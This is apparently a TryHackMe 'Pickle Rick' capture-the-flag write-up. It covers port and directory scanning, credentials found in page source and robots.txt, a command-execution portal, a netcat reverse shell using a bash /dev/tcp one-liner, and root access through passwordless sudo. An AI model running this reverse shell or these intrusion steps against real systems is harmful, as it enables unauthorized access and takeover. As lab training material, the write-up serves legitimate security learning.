*[Image: Pickle Rick Cover Image]*
# Pickle Rick CTF Writeup

## NMAP Scan
```
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-11 17:59 GMT
Nmap scan report for 10.10.32.121
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 463661da27ac12579f77e04349112ba9 (RSA)
|   256 30d8339c46870d29365ff6770c7f31c3 (ECDSA)
|_  256 f35aa4804bd71f7d68a4735ad4e9e489 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
From the NMAP scan, I can see that there is a website hosted on port 80. Browsing to the website, it seems to be a pretty uninteresting page. So I decide to do a Gobuster scan.

## Gobuster Scan
```
/index.html
/login.php
/assets
/portal.php
/robots.txt
```
Checking **/robots.txt** I see there is some text, I first thought maybe it could be a directory, but trying to browse to it returns a **404 Not Found** so I noted it down anyway, _maybe it'll come in handy later..._

**/assets** just contains images, CSS, and JavaScript files but nothing useful.

**/portal.php** redirects straight to the **/login.php** page.

At this point I thought I'd view the source code of the pages and there just happened to be some useful information waiting for me in the HTML of **/index.html**
```
Note to self, remember username!
Username: R1ckRul3s
```

Well, now we have a username, maybe we can try guess some passwords for the login page. Remembering the text we found before in **/robots.txt**, maybe that could be a possible password... SUCCESS! I'm logged in and redirected to **/portal.php**. It's a dashboard where I can run system commands on the machine.

## Foothold
Running the command `ls`, it returns a list of files in the directory of the webserver:
```
Sup3rS3cretPickl3Ingred.txt   <-- This is the first flag we need for the CTF
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

Trying to read files using `cat`, it returns that the command is blocked. Instead, I decided to get a shell on the machine.

- First I started a listener: `nc -nvlp <port>`
- Then I ran this command to get a reverse shell: `bash -c "bash -i >& /dev/tcp/<ip_address>/<port> 0>&1"`

A shell on the machine! Now I can read the **Sup3rS3cretPickl3Ingred.txt** file to get the first flag.

Changing directory to **/home** I see there are two home directories, **rick** and **ubuntu**. Moving into **/home/rick** I see the second flag needed for the CTF.

## Privilege Escalation (root)
Running `sudo -l` to check if the user had any sudo privileges returned:
```
User www-data may run the following commands on ip-10-10-153-73.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```
Fantastic! I can run any command I want, using sudo, with NO PASSWORD!

I run `sudo /bin/bash` spawns a root shell!

Changing directory to **/root**, I find the final flag needed to complete the CTF!

TryHackme Pickle Rick CTF: [https://tryhackme.com/room/picklerick](https://tryhackme.com/room/picklerick)
